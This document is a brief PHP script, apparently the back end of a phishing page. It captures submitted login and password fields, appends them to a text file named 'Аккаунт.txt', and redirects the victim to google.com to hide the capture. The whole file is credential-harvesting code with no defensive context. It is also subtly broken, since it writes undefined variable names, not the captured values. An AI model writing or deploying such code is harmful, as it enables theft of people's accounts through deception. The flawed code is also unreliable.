<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("Аккаунт.txt","at");
fwrite($log,"$Логин:$Пароль\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://www.google.com/'></head></html>";
?>